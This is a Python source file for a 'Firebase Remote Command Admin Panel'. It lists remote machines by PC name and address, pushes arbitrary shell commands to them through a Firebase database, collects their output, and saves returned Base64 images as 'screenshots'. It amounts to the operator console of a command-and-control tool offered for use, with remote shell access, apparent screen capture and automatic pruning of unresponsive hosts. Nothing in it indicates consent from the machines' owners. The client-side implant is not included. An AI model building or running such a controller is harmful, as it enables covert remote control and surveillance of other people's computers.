import firebase_admin
from firebase_admin import credentials, db
from dotenv import load_dotenv
import os
from datetime import datetime
import json
import time
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.layout import Layout
from rich.live import Live
from rich.prompt import Prompt, Confirm
from rich.syntax import Syntax
from rich import box
import threading
import base64
import re

load_dotenv()

console = Console()

# Initialize Firebase
cred = credentials.Certificate(os.getenv("FIREBASE_SERVICE_ACCOUNT_KEY_PATH"))
firebase_admin.initialize_app(cred, {
    'databaseURL': os.getenv("FIREBASE_DATABASE_URL")
})

COMMANDS_FILE = "command_templates.json"

class AdminPanel:
    def __init__(self):
        self.selected_client = None
        self.output_listener = None
        self.last_output = None
        self.command_templates = self.load_command_templates()
        self.cleanup_lock = threading.Lock()
        self.output_received = threading.Event()
        self.pending_output = None
    
    def load_command_templates(self):
        """Load command templates from JSON file"""
        if os.path.exists(COMMANDS_FILE):
            with open(COMMANDS_FILE, 'r') as f:
                return json.load(f)
        return []
    
    def save_command_templates(self):
        """Save command templates to JSON file"""
        with open(COMMANDS_FILE, 'w') as f:
            json.dump(self.command_templates, f, indent=2)
    
    def get_all_clients(self):
        """Fetch all clients from Firebase"""
        try:
            root_ref = db.reference('/')
            all_data = root_ref.get()
            
            if not all_data:
                return []
            
            clients = []
            for client_id, data in all_data.items():
                if isinstance(data, dict):
                    clients.append({
                        'id': client_id,
                        'pc_name': data.get('pc_name', 'Unknown'),
                        'status': data.get('status', 'Unknown'),
                        'last_seen': data.get('last_seen', 'Never'),
                        'address': data.get('address', 'Unknown')
                    })
            
            return clients
        except Exception as e:
            console.print(f"[red]Error fetching clients: {e}[/red]")
            return []
    
    def cleanup_dead_clients(self):
        """Send whoami then pwd to all clients and remove those that don't respond to either"""
        with self.cleanup_lock:
            console.print("[yellow]🔍 Checking for inactive clients...[/yellow]")
            clients = self.get_all_clients()
            
            if not clients:
                console.print("[dim]No clients to check[/dim]")
                return
            
            # Store output values for comparison
            first_outputs = {}
            second_outputs = {}
            
            # Send whoami to all clients at once
            console.print("[dim]Sending 'whoami' command to all clients...[/dim]")
            for client in clients:
                client_id = client['id']
                try:
                    command_ref = db.reference(f'/{client_id}/exe/command')
                    command_ref.set('whoami')
                except:
                    pass
            
            # Wait 2 seconds
            console.print("[dim]Waiting 2 seconds...[/dim]")
            time.sleep(2)
            
            # Read output after first command
            for client in clients:
                client_id = client['id']
                try:
                    output_ref = db.reference(f'/{client_id}/exe/output')
                    first_outputs[client_id] = output_ref.get()
                except:
                    first_outputs[client_id] = None
            
            # Send pwd to all clients at once
            console.print("[dim]Sending 'pwd' command to all clients...[/dim]")
            for client in clients:
                client_id = client['id']
                try:
                    command_ref = db.reference(f'/{client_id}/exe/command')
                    command_ref.set('pwd')
                except:
                    pass
            
            # Wait 2 seconds
            console.print("[dim]Waiting 2 seconds...[/dim]")
            time.sleep(2)
            
            # Read output after second command
            for client in clients:
                client_id = client['id']
                try:
                    output_ref = db.reference(f'/{client_id}/exe/output')
                    second_outputs[client_id] = output_ref.get()
                except:
                    second_outputs[client_id] = None
            
            # Remove clients where output didn't change
            removed_count = 0
            for client in clients:
                client_id = client['id']
                
                first_val = first_outputs.get(client_id)
                second_val = second_outputs.get(client_id)
                
                # Client is inactive if output is identical after both commands
                if first_val == second_val:
                    try:
                        console.print(f"[red]✗ Removing inactive client: {client['pc_name']} ({client_id[:16]}...)[/red]")
                        client_ref = db.reference(f'/{client_id}')
                        client_ref.delete()
                        removed_count += 1
                    except Exception as e:
                        console.print(f"[red]Error removing {client_id}: {e}[/red]")
            
            if removed_count > 0:
                console.print(f"[green]✓ Removed {removed_count} inactive client(s)[/green]")
            else:
                console.print("[green]✓ All clients are active[/green]")
            
            time.sleep(1)
    
    def display_clients(self, skip_cleanup=False):
        """Display all clients in a nice table"""
        if not skip_cleanup:
            self.cleanup_dead_clients()
        
        clients = self.get_all_clients()
        
        if not clients:
            console.print("[yellow]No clients found[/yellow]")
            return []
        
        table = Table(title="🖥️  Connected Clients", box=box.ROUNDED)
        table.add_column("Index", style="cyan", no_wrap=True)
        table.add_column("PC Name", style="magenta")
        table.add_column("Client ID", style="blue")
        table.add_column("Status", style="green")
        table.add_column("Last Seen", style="yellow")
        table.add_column("Address", style="white")
        
        for idx, client in enumerate(clients, 1):
            status_style = "green" if client['status'] == 'connected' else "red"
            table.add_row(
                str(idx),
                client['pc_name'],
                client['id'][:16] + "...",
                f"[{status_style}]{client['status']}[/{status_style}]",
                client['last_seen'][:19] if len(client['last_seen']) > 19 else client['last_seen'],
                client['address']
            )
        
        console.print(table)
        return clients
    
    def send_command(self, client_id, command):
        """Send command to a specific client"""
        try:
            command_ref = db.reference(f'/{client_id}/exe/command')
            command_ref.set(command)
            console.print(f"[green]✓ Command sent to client[/green]")
            return True
        except Exception as e:
            console.print(f"[red]✗ Error sending command: {e}[/red]")
            return False
    
    def get_output(self, client_id):
        """Get output from a specific client"""
        try:
            output_ref = db.reference(f'/{client_id}/exe/output')
            output = output_ref.get()
            return output if output else "No output yet"
        except Exception as e:
            console.print(f"[red]Error fetching output: {e}[/red]")
            return None
    
    def start_output_listener(self, client_id):
        """Start listening to output changes"""
        def listener(event):
            self.last_output = event.data
            self.pending_output = event.data
            self.output_received.set()
        
        try:
            output_ref = db.reference(f'/{client_id}/exe/output')
            self.output_listener = output_ref.listen(listener)
        except Exception as e:
            console.print(f"[red]Error starting listener: {e}[/red]")
    
    def stop_output_listener(self):
        """Stop listening to output changes"""
        if self.output_listener:
            try:
                self.output_listener.close()
                self.output_listener = None
            except:
                pass
    
    def is_base64_image(self, text):
        """Check if the text contains Base64 encoded image data"""
        if not text or not isinstance(text, str):
            return False
        # Check for common Base64 image patterns
        text = text.strip()
        return (text.startswith('/9j/') or  # JPEG
                text.startswith('iVBORw0KGgo') or  # PNG
                text.startswith('R0lGOD') or  # GIF
                (len(text) > 100 and re.match(r'^[A-Za-z0-9+/]+=*$', text)))
    
    def save_base64_image(self, base64_data, client_id):
        """Convert Base64 data to image and save it"""
        try:
            # Clean up the base64 string
            base64_data = base64_data.strip()
            
            # Decode base64 to binary
            image_data = base64.b64decode(base64_data)
            
            # Determine file extension
            if base64_data.startswith('/9j/'):
                ext = 'jpg'
            elif base64_data.startswith('iVBORw0KGgo'):
                ext = 'png'
            elif base64_data.startswith('R0lGOD'):
                ext = 'gif'
            else:
                ext = 'png'  # Default
            
            # Create output directory if not exists
            os.makedirs('screenshots', exist_ok=True)
            
            # Generate filename
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"screenshots/{client_id[:8]}_{timestamp}.{ext}"
            
            # Save image
            with open(filename, 'wb') as f:
                f.write(image_data)
            
            console.print(f"[green]✓ Image saved: {filename}[/green]")
            return filename
        except Exception as e:
            console.print(f"[red]✗ Error saving image: {e}[/red]")
            return None
    
    def wait_for_output(self, client_id, command, timeout=10):
        """Wait for command output with timeout"""
        self.output_received.clear()
        self.pending_output = None
        
        # Send command
        if not self.send_command(client_id, command):
            return
        
        # Wait for response
        console.print("[dim]Waiting for response...[/dim]")
        if self.output_received.wait(timeout=timeout):
            output = self.pending_output
            
            # Check if output is Base64 image
            if self.is_base64_image(output):
                self.save_base64_image(output, client_id)
            else:
                # Print normal output
                console.print(f"[green]{output}[/green]")
        else:
            console.print("[yellow]⏱️  No response within 10 seconds[/yellow]")
    
    def client_control_panel(self, client):
        """Interactive command-line interface for a specific client"""
        self.selected_client = client
        client_id = client['id']
        pc_name = client['pc_name']
        
        console.clear()
        console.print(Panel(
            f"[bold cyan]Connected to: {pc_name}[/bold cyan]\n"
            f"Client ID: [blue]{client_id[:16]}...[/blue]",
            title="🎛️  Command Shell",
            border_style="cyan"
        ))
        
        console.print("[dim]Type commands and press Enter. Type 'back' to return to client list or 'exit' to quit.[/dim]\n")
        
        # Start output listener
        self.start_output_listener(client_id)
        
        while True:
            try:
                command = Prompt.ask(f"[cyan]{pc_name}[/cyan] $")
                
                if not command:
                    continue
                
                # Check for exit/back BEFORE sending to database
                if command.lower() == 'exit':
                    self.stop_output_listener()
                    return "exit"
                
                if command.lower() == 'back':
                    self.stop_output_listener()
                    return "back"
                
                # Execute command and wait for output
                self.wait_for_output(client_id, command)
                
            except KeyboardInterrupt:
                console.print("\n[yellow]Use 'exit' to quit or 'back' to return to client list[/yellow]")
                continue
            except EOFError:
                break
        
        self.stop_output_listener()
        return "back"
    
    def use_command_template(self, client_id):
        """Use a command template"""
        if not self.command_templates:
            console.print("[yellow]No command templates available[/yellow]")
            return
        
        console.print("\n[bold]Available Templates:[/bold]")
        for idx, template in enumerate(self.command_templates, 1):
            console.print(f"  [cyan]{idx}.[/cyan] {template['title']}")
        
        choice = Prompt.ask("\n[cyan]Select template (0 to cancel)[/cyan]", default="0")
        
        try:
            idx = int(choice)
            if idx == 0:
                return
            if 1 <= idx <= len(self.command_templates):
                template = self.command_templates[idx - 1]
                
                # Check if template needs arguments
                command = template['command']
                if '<' in command and '>' in command:
                    console.print(f"[yellow]This template requires arguments[/yellow]")
                    console.print(f"Template: {command}")
                    
                    # Extract argument placeholders
                    import re
                    placeholders = re.findall(r'<([^>]+)>', command)
                    
                    for placeholder in placeholders:
                        value = Prompt.ask(f"[cyan]Enter {placeholder}[/cyan]")
                        command = command.replace(f"<{placeholder}>", value)
                
                console.print(f"\n[yellow]Final command:[/yellow] {command}")
                if Confirm.ask("Execute this command?"):
                    self.send_command(client_id, command)
            else:
                console.print("[red]Invalid selection[/red]")
        except ValueError:
            console.print("[red]Invalid input[/red]")
    
    def manage_templates(self):
        """Manage command templates"""
        while True:
            console.print("\n[bold]Template Management:[/bold]")
            console.print("  [cyan]1.[/cyan] List templates")
            console.print("  [cyan]2.[/cyan] Add new template")
            console.print("  [cyan]3.[/cyan] Delete template")
            console.print("  [cyan]4.[/cyan] Back")
            
            choice = Prompt.ask("[cyan]>[/cyan] Choose action", default="4")
            
            if choice == "1":
                self.list_templates()
            elif choice == "2":
                self.add_template()
            elif choice == "3":
                self.delete_template()
            elif choice == "4":
                break
    
    def list_templates(self):
        """List all command templates"""
        if not self.command_templates:
            console.print("[yellow]No templates available[/yellow]")
            return
        
        table = Table(title="Command Templates", box=box.ROUNDED)
        table.add_column("Index", style="cyan")
        table.add_column("Title", style="magenta")
        table.add_column("Command", style="yellow")
        
        for idx, template in enumerate(self.command_templates, 1):
            table.add_row(
                str(idx),
                template['title'],
                template['command'][:50] + "..." if len(template['command']) > 50 else template['command']
            )
        
        console.print(table)
    
    def add_template(self):
        """Add a new command template"""
        console.print("\n[bold cyan]Add New Command Template[/bold cyan]")
        console.print("[dim]Use <argument_name> for placeholders, e.g., <image path>[/dim]\n")
        
        title = Prompt.ask("[yellow]Template title[/yellow]")
        command = Prompt.ask("[yellow]Command (use <arg> for arguments)[/yellow]")
        
        if title and command:
            self.command_templates.append({
                'title': title,
                'command': command
            })
            self.save_command_templates()
            console.print("[green]✓ Template added successfully[/green]")
        else:
            console.print("[red]✗ Title and command are required[/red]")
    
    def delete_template(self):
        """Delete a command template"""
        if not self.command_templates:
            console.print("[yellow]No templates to delete[/yellow]")
            return
        
        self.list_templates()
        choice = Prompt.ask("\n[cyan]Enter template number to delete (0 to cancel)[/cyan]", default="0")
        
        try:
            idx = int(choice)
            if idx == 0:
                return
            if 1 <= idx <= len(self.command_templates):
                template = self.command_templates.pop(idx - 1)
                self.save_command_templates()
                console.print(f"[green]✓ Template '{template['title']}' deleted[/green]")
            else:
                console.print("[red]Invalid selection[/red]")
        except ValueError:
            console.print("[red]Invalid input[/red]")
    
    def main_menu(self):
        """Main menu loop"""
        console.clear()
        console.print(Panel.fit(
            "[bold cyan]Firebase Remote Command Admin Panel[/bold cyan]\n"
            "[dim]Control and monitor remote clients[/dim]",
            border_style="cyan"
        ))
        
        # Perform initial cleanup
        console.print("\n[yellow]Performing initial client cleanup...[/yellow]")
        self.cleanup_dead_clients()
        
        while True:
            console.print("\n")
            clients = self.display_clients(skip_cleanup=True)
            
            if not clients:
                console.print("\n[yellow]Waiting for clients...[/yellow]")
                time.sleep(2)
                console.clear()
                # Retry cleanup on next iteration
                console.print(Panel.fit(
                    "[bold cyan]Firebase Remote Command Admin Panel[/bold cyan]\n"
                    "[dim]Control and monitor remote clients[/dim]",
                    border_style="cyan"
                ))
                continue
            
            console.print("\n[bold]Options:[/bold]")
            console.print("  [cyan]<number>[/cyan] - Select client by index")
            console.print("  [cyan]r[/cyan] - Refresh client list")
            console.print("  [cyan]t[/cyan] - Manage command templates")
            console.print("  [cyan]q[/cyan] - Quit\n")
            
            choice = Prompt.ask("[cyan]>[/cyan] Choose action", default="r")
            
            if choice.lower() == 'q':
                console.print("[yellow]Goodbye![/yellow]")
                break
            elif choice.lower() == 'r':
                self.cleanup_dead_clients()
                console.clear()
                continue
            elif choice.lower() == 't':
                self.manage_templates()
                console.clear()
            else:
                try:
                    idx = int(choice)
                    if 1 <= idx <= len(clients):
                        result = self.client_control_panel(clients[idx - 1])
                        if result == "exit":
                            break
                        console.clear()
                    else:
                        console.print("[red]Invalid client number[/red]")
                except ValueError:
                    console.print("[red]Invalid input[/red]")

def main():
    try:
        admin = AdminPanel()
        admin.main_menu()
    except KeyboardInterrupt:
        console.print("\n[yellow]Exiting...[/yellow]")
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
